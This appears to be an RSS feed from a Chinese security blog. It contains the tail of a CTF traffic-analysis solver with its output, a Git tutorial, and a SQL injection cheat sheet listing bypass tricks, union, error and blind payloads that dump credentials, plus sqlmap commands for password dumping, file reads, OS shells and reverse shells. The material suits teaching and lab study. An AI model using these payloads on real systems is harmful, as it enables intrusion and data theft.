+    m = re.search(r&quot;Authorization:\s*Bearer\s+([A-Za-z0-9_\-\.]+)&quot;, headers, re.IGNORECASE)
+    if not m:
+        return None
+    jwt = m.group(1)
+    body = body.strip()
+    try:
+        body_json = json.loads(body)
+    except Exception:
+        return None
+    return jwt, body_json
+
+
+def jwt_payload(jwt: str):
+    try:
+        _, payload_b64, _ = jwt.split(&quot;.&quot;)
+        return json.loads(b64url_decode(payload_b64))
+    except Exception:
+        return None
+
+
+def main():
+    ap = argparse.ArgumentParser()
+    ap.add_argument(&quot;--params&quot;, required=True, help=&quot;params.csv&quot;)
+    ap.add_argument(&quot;--pcapdir&quot;, required=True, help=&quot;dir containing *.pcap&quot;)
+    args = ap.parse_args()
+
+    # n -&amp;gt; (id,e,p,q)
+    n_map = {}
+    with open(args.params, newline=&quot;&quot;, encoding=&quot;utf-8&quot;) as f:
+        r = csv.DictReader(f)
+        for row in r:
+            _id = int(row[&quot;id&quot;])
+            e = int(row[&quot;e&quot;])
+            p = int(row[&quot;p&quot;])
+            q = int(row[&quot;q&quot;])
+            n_map[p * q] = (_id, e, p, q)
+
+    pcaps = sorted(Path(args.pcapdir).glob(&quot;*.pcap&quot;))
+    if not pcaps:
+        raise SystemExit(&quot;No pcaps found&quot;)
+
+    over_users = set()
+    total = 0
+
+    for pcap in pcaps:
+        http = extract_http_from_pcap(pcap, n_map)
+        if not http:
+            continue
+        res = extract_jwt_and_body(http)
+        if not res:
+            continue
+        jwt, body = res
+        payload = jwt_payload(jwt)
+        if not payload:
+            continue
+
+        total += 1
+
+        bad = False
+        for k in (&quot;username&quot;, &quot;phone&quot;):
+            if k in payload and k in body and str(payload[k]) != str(body[k]):
+                bad = True
+        if bad and &quot;username&quot; in payload:
+            over_users.add(payload[&quot;username&quot;])
+
+    n = len(over_users)
+    print(f&quot;total_requests={total}&quot;)
+    print(f&quot;overpriv_accounts={n}&quot;)
+    print(f&quot;md5={hashlib.md5(str(n).encode()).hexdigest()}&quot;)
+
+    print(&quot;\n[+] Over-privileged usernames (dedup):&quot;)
+    for u in sorted(over_users):
+        print(u)
+
+
+if __name__ == &quot;__main__&quot;:
+    main()
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;得到答案&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;$ python solve_task3.py --params ./params.csv --pcapdir ./pcap/
+total_requests=500
+overpriv_accounts=5
+md5=e4da3b7fbbce2345d7772b0674a318d5
+
+[+] Over-privileged usernames (dedup):
+宋建平
+王丽娟
+蔡旭
+赵平
+魏云
+&lt;/code&gt;&lt;/pre&gt;
+</content:encoded></item><item><title>Git</title><link>https://acidzang.github.io/posts/git/</link><guid isPermaLink="true">https://acidzang.github.io/posts/git/</guid><description>git 入门</description><pubDate>Mon, 01 Dec 2025 00:00:00 GMT</pubDate><content:encoded>&lt;h2&gt;1.简介&lt;/h2&gt;
+&lt;p&gt;Git 是一个开源的分布式版本控制系统，用于敏捷高效地处理任何或小或大的项目。&lt;br /&gt;
+Git 是 Linus Torvalds 为了帮助管理 Linux 内核开发而开发的一个开放源码的版本控制软件。&lt;br /&gt;
+Git 与常用的版本控制工具 CVS, Subversion 等不同，它采用了分布式版本库的方式，不必服务器端软件支持。&lt;/p&gt;
+&lt;h2&gt;2.安装&lt;/h2&gt;
+&lt;p&gt;Git 各平台安装包下载地址&lt;a href=&quot;https://git-scm.com/install/&quot;&gt;https://git-scm.com/install/&lt;/a&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;# Debian/Ubuntu
+apt-get install git
+
+#Centos/RedHat
+yum -y install git-core
+
+#源码安装
+git clone https://github.com/git/git
+
+# windows
+winget install --id Git.Git -e --source winget
+
+# MAC
+brew install git
+brew install git-gui
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2&gt;3.配置&lt;/h2&gt;
+&lt;p&gt;&lt;strong&gt;/etc/gitconfig&lt;/strong&gt;：对所有用户都适用，&lt;code&gt;git config --system &lt;/code&gt;;&lt;br /&gt;
+&lt;strong&gt;~/.gitconfig&lt;/strong&gt;：用户目录下的配置文件，&lt;code&gt;git config  --global&lt;/code&gt;;&lt;br /&gt;
+&lt;strong&gt;.git/config&lt;/strong&gt;：仅针对当前项目， &lt;code&gt;.git/config&lt;/code&gt; 里的配置会覆盖 &lt;code&gt;/etc/gitconfig&lt;/code&gt; 中的同名变量;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;# 用户信息
+git config --global user.name &quot;Frank&quot;
+git config --global user.email Frank@gmail.com
+
+# 文本编辑器
+git config --global core.editor &quot;code --wait&quot;
+
+# 差异分析工具
+git config --global merge.tool vimdiff
+
+# 查看配置信息
+git config --list
+
+# 验证安装
+git --version
+git config --list
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2&gt;4.工作流程&lt;/h2&gt;
+&lt;pre&gt;&lt;code&gt;# 克隆仓库
+git clone https://github.com/username/sec.git
+cd sec
+
+# 创建新分支
+git branch                       # 列出本地分支
+git branch -r                    # 远程分支
+git branch -a                    # 本地+远程
+git branch feature               # 创建
+git switch -c feature            # 新建并切换
+
+# 暂存文件
+git add filename
+# 或者添加所有修改的文件,添加文件到暂存区
+git add .
+# 查看仓库当前的状态，显示有变更的文件
+git status
+
+# 提交更改,提交暂存区到本地仓库
+git commit -m &quot;Add new feature&quot;
+# 查看提交历史
+git log
+# 查看工作区和暂存区之间的差异
+git diff
+# 查看暂存区和最后一次提交之间的差异
+git diff --cached
+
+# 拉取最新更改
+git pull origin main
+# 或者如果在新的分支上工作
+git pull origin new-feature
+
+# 推送更改
+git push origin new-feature
+
+# 创建 Pull Request（PR）
+# 合并更改
+git switch main
+git pull origin main
+git merge new-feature
+
+# 回退版本
+git reset
+# 将文件从暂存区和工作区中删除
+git rm
+# 移动或重命名工作区文件
+git mv
+# 添加注释
+git notes
+# 分支切换
+git switch
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2&gt;5.工作区、暂存区、版本库&lt;/h2&gt;
+&lt;p&gt;&lt;strong&gt;工作区&lt;/strong&gt;：电脑里能看到的目录&lt;br /&gt;
+&lt;strong&gt;暂存区&lt;/strong&gt;： stage 或 index&lt;br /&gt;
+&lt;strong&gt;版本库&lt;/strong&gt;：工作区有一个隐藏目录 &lt;code&gt;.git&lt;/code&gt;&lt;/p&gt;
+&lt;h2&gt;6.创建仓库&lt;/h2&gt;
+&lt;p&gt;&lt;strong&gt;git init&lt;/strong&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;mkdir my-project
+cd my-project
+# 初始化一个 Git 仓库
+git init
+
+# 指定目录作为Git仓库
+git init newrepo
+
+git add *.c
+git add README
+git commit -m &apos;初始化项目版本&apos;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;strong&gt;git clone&lt;/strong&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;git clone &amp;lt;repo&amp;gt;
+git clone &amp;lt;repo&amp;gt; &amp;lt;directory&amp;gt;
+
+# 显示当前的 git 配置信息
+git config --list
+
+# 编辑 git 配置文件,针对当前仓库
+git config -e
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2&gt;7.文件状态&lt;/h2&gt;
+&lt;p&gt;文件状态分为三种：工作目录（Working Directory）、暂存区（Staging Area）、本地仓库（Local Repository）。&lt;br /&gt;
+&lt;strong&gt;工作目录（Working Directory）&lt;/strong&gt;：实际操作文件的地方，包括查看、编辑、删除和创建文件；所有对文件的更改首先发生在工作目录中。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;未跟踪（Untracked）：新创建的文件，未被 Git 记录&lt;/li&gt;
+&lt;li&gt;已修改（Modified）：已被 Git 跟踪的文件发生了更改，但这些更改还没有被提交到 Git 记录中&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;暂存区（Staging Area）&lt;/strong&gt;：也称为索引（Index），，是一个临时存储区域，用于保存即将提交到本地仓库的更改。&lt;br /&gt;
+&lt;strong&gt;本地仓库（Local Repository）&lt;/strong&gt;：隐藏在 .git 目录中的数据库，用于存储项目的所有提交历史记录。每次提交更改时，Git 会将暂存区中的内容保存到本地仓库中。&lt;/p&gt;
+</content:encoded></item><item><title>SQL注入</title><link>https://acidzang.github.io/posts/sqlinjection/</link><guid isPermaLink="true">https://acidzang.github.io/posts/sqlinjection/</guid><description>sql注入与sqlmap小结</description><pubDate>Sun, 16 Nov 2025 00:00:00 GMT</pubDate><content:encoded>&lt;h2&gt;1. 基础&lt;/h2&gt;
+&lt;h3&gt;1.1 原理&lt;/h3&gt;
+&lt;p&gt;当web应用向后台数据库传递SQL语句进行数据库操作时，如果对用户输入的参数没有经过严格的过滤处理，那么攻击者就可以构造特殊的SQL语句，直接输入数据库引擎执行，获取或修改数据库中的数据。&lt;/p&gt;
+&lt;h3&gt;1.2 产生条件&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;动态拼接字符串&lt;/li&gt;
+&lt;li&gt;用户能控制输入的内容&lt;/li&gt;
+&lt;li&gt;把用户输入的内容带入到数据库执行&lt;/li&gt;
+&lt;li&gt;缺乏参数化、输入校验&lt;/li&gt;
+&lt;li&gt;数据库账号权限&lt;/li&gt;
+&lt;li&gt;可观察（内容、错误、时间等）&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;1.3 本质&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;代码中执行的SQL语句存在可控变量&lt;/li&gt;
+&lt;li&gt;数据与代码边界被打破&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr /&gt;
+&lt;h2&gt;2. 注入点分析&lt;/h2&gt;
+&lt;h3&gt;2.1 注入点类型&lt;/h3&gt;
+&lt;h4&gt;2.1.1 数字型&lt;/h4&gt;
+&lt;pre&gt;&lt;code&gt;SELECT * FROM users WHERE id = 1;
+-- 拼接
+&quot;SELECT * FROM users WHERE id &quot; + id;
+/user.php?id=1
+1 AND 1=1
+1 AND 1=2
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h4&gt;2.1.2 字符型&lt;/h4&gt;
+&lt;pre&gt;&lt;code&gt;SELECT * FROM users WHERE name = &apos;admin&apos;;
+-- 拼接
+&quot;SELECT * FROM users WHERE name = &apos;&quot; + name + &quot;&apos;&quot;;
+/user.php?name=admin
+&apos; OR &apos;1&apos;=&apos;1
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h4&gt;2.1.3 搜索型&lt;/h4&gt;
+&lt;pre&gt;&lt;code&gt;SELECT * FROM products WHERE title LIKE &apos;%keyword%&apos;;
+--拼接
+&quot;SELECT * FROM products WHERE title LIKE &apos;%&quot; + keyword + &quot;%&apos;&quot;;
+/search.php?q=phone
+LIKE &apos;%xxx%&apos;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h4&gt;2.1.4 Header 注入&lt;/h4&gt;
+&lt;pre&gt;&lt;code&gt;INSERT INTO logs (ua) VALUES (&apos;[User-Agent]&apos;);
+-- User-Agent
+-- Referer
+-- X-Forwarded-For
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h4&gt;2.1.5 Cookie 注入&lt;/h4&gt;
+&lt;pre&gt;&lt;code&gt;SELECT * FROM users WHERE id = [cookie_userid];
+-- 从 Cookie 取用户 ID、偏好、会话信息等，直接拼接 SQL
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h4&gt;2.1.6 其他&lt;/h4&gt;
+&lt;pre&gt;&lt;code&gt;-- XML
+&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;
+&amp;lt;news&amp;gt;
+    &amp;lt;article&amp;gt;
+        &amp;lt;id&amp;gt;1&amp;lt;/id&amp;gt;
+        &amp;lt;title&amp;gt;xiaodi&amp;lt;/title&amp;gt;
+        &amp;lt;content&amp;gt;xml test&amp;lt;/content&amp;gt;
+        &amp;lt;created_at&amp;gt;2025-11-15&amp;lt;/created_at&amp;gt;
+    &amp;lt;/article&amp;gt;
+&amp;lt;/news&amp;gt;
+-- JSON
+{
+    &quot;news:&quot;
+        {
+            &quot;id&quot;: 1,
+            &quot;title&quot;: &quot;json&quot;,
+            &quot;content&quot;: &quot;json test&quot;,
+            &quot;created_at&quot;: &quot;2025-11-15&quot;
+        },
+}
+-- 编码
+&quot;id&quot;: &quot;MQ==&quot;
+-- 混合
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3&gt;2.2 数据库类型判断&lt;/h3&gt;
+&lt;h4&gt;2.2.1 注释符判断&lt;/h4&gt;
+&lt;p&gt;&lt;code&gt;-- &lt;/code&gt;
+&lt;code&gt;#&lt;/code&gt;
+&lt;code&gt;/* ... */&lt;/code&gt;&lt;/p&gt;
+&lt;h4&gt;2.2.2错误信息判断&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;MySQL&lt;/strong&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;&quot;You have an error in your SQL syntax&quot;&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;&quot;MySQL server version for the right syntax&quot;&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;SQL Server&lt;/strong&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;&quot;Microsoft SQL Server&quot;&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;&quot;Unclosed quotation mark after the character string&quot;&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;&quot;Incorrect syntax near&quot;&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Oracle&lt;/strong&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;&quot;ORA-01756&quot;&lt;/code&gt;、&lt;code&gt;&quot;ORA-00933&quot;&lt;/code&gt; 等 &lt;code&gt;ORA-&lt;/code&gt; 前缀&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;&quot;Oracle Database&quot;&lt;/code&gt; 相关描述&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;PostgreSQL&lt;/strong&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;&quot;syntax error at or near&quot;&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;&quot;PG::SyntaxError&quot;&lt;/code&gt;（某些框架）&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4&gt;2.2.3 特有函数/系统表判断&lt;/h4&gt;
+&lt;h5&gt;2.2.3.1 特有函数判断&lt;/h5&gt;
+&lt;ul&gt;
+&lt;li&gt;MySQL：
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;version()&lt;/code&gt;、&lt;code&gt;database()&lt;/code&gt;、&lt;code&gt;@@version&lt;/code&gt;、&lt;code&gt;@@datadir&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;SQL Server：
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;@@version&lt;/code&gt;、&lt;code&gt;db_name()&lt;/code&gt;、&lt;code&gt;host_name()&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Oracle：
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;user&lt;/code&gt;、&lt;code&gt;sys_context()&lt;/code&gt;、&lt;code&gt;v$&lt;/code&gt; 视图&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;PostgreSQL：
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;version()&lt;/code&gt;、&lt;code&gt;current_database()&lt;/code&gt;、&lt;code&gt;current_schema()&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h5&gt;2.2.3.2 系统表 / 元数据表判断&lt;/h5&gt;
+&lt;ul&gt;
+&lt;li&gt;MySQL：
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;information_schema.schemata&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;information_schema.tables&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;SQL Server：
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;master..sysdatabases&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;sys.databases&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;sysobjects&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Oracle：
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;all_users&lt;/code&gt;、&lt;code&gt;dba_users&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;user_tables&lt;/code&gt;、&lt;code&gt;all_tab_columns&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;PostgreSQL：
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;information_schema.schemata&lt;/code&gt;（也有）&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;pg_catalog.pg_database&lt;/code&gt;、&lt;code&gt;pg_catalog.pg_tables&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;2.3 参数类型判断&lt;/h3&gt;
+&lt;h4&gt;2.3.1 数字型&lt;/h4&gt;
+&lt;pre&gt;&lt;code&gt;SELECT * FROM users WHERE id = 1;
+-- 非数字触发
+?id=a
+-- 布尔表达式
+?id=1 AND 1=1
+?id=1 AND 1=2
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h4&gt;2.3.2 字符型&lt;/h4&gt;
+&lt;pre&gt;&lt;code&gt;SELECT * FROM users WHERE name = &apos;admin&apos;;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;闭合测试&lt;code&gt;?name=admin&apos;&lt;/code&gt;&lt;br /&gt;
+布尔表达式&lt;code&gt;?name=admin&apos; AND &apos;1&apos;=&apos;1&lt;/code&gt;&lt;/p&gt;
+&lt;h2&gt;3. 绕过&lt;/h2&gt;
+&lt;h3&gt;3.1 空格&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;双空格
+/**/ 
+用括号绕过 
+回车代替 
+ascii，url编码
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3&gt;3.2 等号&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;like
+rlike 
+regexp
+&amp;lt;
+&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3&gt;3.3 逗号&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;# join语句
+union select * from (select 1)a join (select 2)b join (select 3)
+substr(str from pos for len)
+mid(str from pos for len)
+substring(str from pos)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3&gt;3.4 关键字&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;sel&amp;lt;&amp;gt;ect
+sel/**/ect
+selselectect
+url编码绕过
+16进制编码绕过
+ASCII编码绕过
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3&gt;3.5 大小于号&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;# 返回其中的最大值
+greatest(n1,n2,n3,...)
+# 当str1=str2，返回0，当str1&amp;gt;str2，返回1，当str1&amp;lt;str2，返回-1
+strcmp(str1,str2)
+# 操作符
+in
+# 选取介于两个值之间的数据范围。这些值可以是数值、文本或者日期
+between   and
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3&gt;3.6 等价函数&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;hex()、bin() ==&amp;gt; ascii() 
+sleep() ==&amp;gt;benchmark() 
+concat_ws()==&amp;gt;group_concat() 
+mid()、substr() ==&amp;gt; substring() 
+@@user ==&amp;gt; user() 
+@@datadir ==&amp;gt; datadir()
+&lt;/code&gt;&lt;/pre&gt;
+&lt;hr /&gt;
+&lt;h2&gt;4. 注入方式&lt;/h2&gt;
+&lt;h3&gt;4.1 联合查询注入&lt;/h3&gt;
+&lt;p&gt;回显型 SQL 注入，让数据库把两条 SELECT 的结果集合并返回，并让其中一部分内容被前端渲染出来。&lt;br /&gt;
+&lt;em&gt;&lt;strong&gt;条件&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;列数必须一致&lt;/li&gt;
+&lt;li&gt;数据类型必须兼容&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code&gt;# 确认列数
+ORDER BY 4--
+# 观察回显
+UNION SELECT 1,2,3,4 --+
+# 查当前数据库名
+UNION SELECT 1, database(), 3, 4 --+
+# 查所有数据库名
+UNION SELECT 1, group_concat(schema_name), 3, 4 FROM information_schema.schemata --+
+# 查当前数据库下表名信息
+UNION SELECT 1, group_concat(table_name), 3, 4 FROM information_schema.tables WHERE table_schema=&apos;security&apos; --+
+# 查当前数据库下表名对应列名信息
+UNION SELECT 1, group_concat(column_name), 3, 4 FROM information_schema.columns WHERE table_name=&apos;users&apos; AND table_schema=&apos;security&apos; --+
+# 结合已知查
+UNION SELECT 1, group_concat(username, 0x3a, password), 3, 4 FROM users --+
+UNION SELECT 1, username, 3, 4 FROM users --+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3&gt;4.2 报错注入&lt;/h3&gt;
+&lt;p&gt;回显型注入，通过数据库抛出的错误信息带出数据&lt;br /&gt;
+&lt;em&gt;&lt;strong&gt;条件&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;页面/接口会把数据库错误信息返回给客户端&lt;/li&gt;
+&lt;li&gt;注入点能影响 SQL 语句结构&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code&gt;and updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)
+and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3&gt;4.3 布尔盲注&lt;/h3&gt;
+&lt;p&gt;面不直接回显查询结果，也不一定报错，通过构造一个条件表达式，让页面表现出两种可区分状态（True/False），再用这些“是/否”推断数据。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;and length(database())=7;
+and left(database(),1)=&apos;p&apos;;
+and left(database(),2)=&apos;pi&apos;;
+and substr(database(),1,1)=&apos;p&apos;;
+and substr(database(),2,1)=&apos;i&apos;;
+and ord(left(database(),1))=112;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3&gt;4.4 时间盲注&lt;/h3&gt;
+&lt;p&gt;页面既不回显结果，也没有稳定的 True/False 内容差异，让数据库在条件为真时额外延迟（sleep / heavy computation / wait），再用响应耗时判断 True/False，从而推断数据。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;and sleep(1);
+and if(1&amp;gt;2,sleep(1),0);
+and if(1&amp;lt;2,sleep(1),0);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3&gt;4.5 堆叠注入&lt;/h3&gt;
+&lt;p&gt;通过结束符同时执行多条sql语句&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;mysqli_multi_query() 支持执行多条语句
+
+?id=1&apos;;show tables --+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3&gt;4.6 二次注入&lt;/h3&gt;
+&lt;p&gt;恶意数据存储在数据库后，恶意数据被读取并进入到SQL查询语句导致&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;注册（写入payload）-登录后修改-修改时以当前用户名为条件触发
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3&gt;4.7 参考&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;like &apos;ro%&apos;            #判断ro或ro...是否成立 
+regexp &apos;^xiaodi[a-z]&apos; #匹配xiaodi及xiaodi...等
+if(条件,5,0)          #条件成立 返回5 反之 返回0
+sleep(5)              #SQL语句延时执行5秒
+mid(a,b,c)            #从位置b开始，截取a字符串的c位
+substr(a,b,c)         #从位置b开始，截取字符串a的c长度
+left(database(),1)，database() #left(a,b)从左侧截取a的前b位
+length(database())=8  #判断数据库database()名的长度
+ord=ascii ascii(x)=97 #判断x的ascii码是否等于97
+&lt;/code&gt;&lt;/pre&gt;
+&lt;hr /&gt;
+&lt;h2&gt;5. sqlmap&lt;/h2&gt;
+&lt;h3&gt;5.1 sqlmap 基本使用&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;基本操作笔记：-u  #注入点 
+-f  #指纹判别数据库类型 
+-b  #获取数据库版本信息 
+-p  #指定可测试的参数(?page=1&amp;amp;id=2 -p &quot;page,id&quot;) 
+-D &quot;&quot;  #指定数据库名 
+-T &quot;&quot;  #指定表名 
+-C &quot;&quot;  #指定字段 
+-s &quot;&quot;  #保存注入过程到一个文件,还可中断，下次恢复在注入(保存：-s &quot;xx.log&quot;　　恢复:-s &quot;xx.log&quot; --resume) 
+--level=(1-5) #要执行的测试水平等级，默认为1 
+--risk=(0-3)  #测试执行的风险等级，默认为1 
+--time-sec=(2,5) #延迟响应，默认为5 
+--data #通过POST发送数据 
+--columns        #列出字段 
+--current-user   #获取当前用户名称 
+--current-db     #获取当前数据库名称 
+--users          #列数据库所有用户 
+--passwords      #数据库用户所有密码 
+--privileges     #查看用户权限(--privileges -U root) 
+-U               #指定数据库用户 
+--dbs            #列出所有数据库 
+--tables -D &quot;&quot;   #列出指定数据库中的表 
+--columns -T &quot;user&quot; -D &quot;mysql&quot;      #列出mysql数据库中的user表的所有字段 
+--dump-all            #列出所有数据库所有表 
+--exclude-sysdbs      #只列出用户自己新建的数据库和表 
+--dump -T &quot;&quot; -D &quot;&quot; -C &quot;&quot;   #列出指定数据库的表的字段的数据(--dump -T users -D master -C surname) 
+--dump -T &quot;&quot; -D &quot;&quot; --start 2 --top 4  # 列出指定数据库的表的2-4字段的数据 
+--dbms    #指定数据库(MySQL,Oracle,PostgreSQL,Microsoft SQL Server,Microsoft Access,SQLite,Firebird,Sybase,SAP MaxDB) 
+--os      #指定系统(Linux,Windows) 
+-v  #详细的等级(0-6) 
+    0：只显示Python的回溯，错误和关键消息。 
+    1：显示信息和警告消息。 
+    2：显示调试消息。 
+    3：有效载荷注入。 
+    4：显示HTTP请求。 
+    5：显示HTTP响应头。 
+    6：显示HTTP响应页面的内容 
+--privileges  #查看权限 
+--is-dba      #是否是数据库管理员 
+--roles       #枚举数据库用户角色 
+--udf-inject  #导入用户自定义函数（获取系统权限） 
+--union-check  #是否支持union 注入 
+--union-cols #union 查询表记录 
+--union-test #union 语句测试 
+--union-use  #采用union 注入 
+--union-tech orderby #union配合order by 
+--data &quot;&quot; #POST方式提交数据(--data &quot;page=1&amp;amp;id=2&quot;) 
+--cookie &quot;用;号分开&quot;      #cookie注入(--cookies=”PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low”) 
+--referer &quot;&quot;     #使用referer欺骗(--referer &quot;http://www.baidu.com&quot;) 
+--user-agent &quot;&quot;  #自定义user-agent 
+--proxy &quot;http://127.0.0.1:8118&quot; #代理注入 
+--string=&quot;&quot;    #指定关键词,字符串匹配. 
+--threads 　　  #采用多线程(--threads 3) 
+--sql-shell    #执行指定sql命令 
+--sql-query    #执行指定的sql语句(--sql-query &quot;SELECT password FROM mysql.user WHERE user = &apos;root&apos; LIMIT 0, 1&quot; ) 
+--file-read    #读取指定文件 
+--file-write   #写入本地文件(--file-write /test/test.txt --file-dest /var/www/html/1.txt;将本地的test.txt文件写入到目标的1.txt) 
+--file-dest    #要写入的文件绝对路径 
+--os-cmd=id    #执行系统命令 
+--os-shell     #系统交互shell 
+--os-pwn       #反弹shell(--os-pwn --msf-path=/opt/framework/msf3/) 
+--msf-path=    #matesploit绝对路径(--msf-path=/opt/framework/msf3/) 
+--os-smbrelay  # 
+--os-bof       # 
+--reg-read     #读取win系统注册表 
+--priv-esc     # 
+--time-sec=    #延迟设置 默认--time-sec=5 为5秒 
+-p &quot;user-agent&quot; --user-agent &quot;sqlmap/0.7rc1 (http://sqlmap.sourceforge.net)&quot;  #指定user-agent注入 
+--eta          #盲注 
+/pentest/database/sqlmap/txt/
+common-columns.txt　　字段字典　　　 
+common-outputs.txt 
+common-tables.txt      表字典 
+keywords.txt 
+oracle-default-passwords.txt 
+user-agents.txt 
+wordlist.txt 
+
+常用语句 :
+1./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -f -b --current-user --current-db --users --passwords --dbs -v 0 
+2./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --passwords -U root --union-use -v 2 
+3./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --dump -T users -C username -D userdb --start 2 --stop 3 -v 2 
+4./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --dump -C &quot;user,pass&quot;  -v 1 --exclude-sysdbs 
+5./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --sql-shell -v 2 
+6./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --file-read &quot;c:\boot.ini&quot; -v 2 
+7./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --file-write /test/test.txt --file-dest /var/www/html/1.txt -v 2 
+8./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-cmd &quot;id&quot; -v 1 
+9./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-shell --union-use -v 2 
+10./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-pwn --msf-path=/opt/framework/msf3 --priv-esc -v 1 
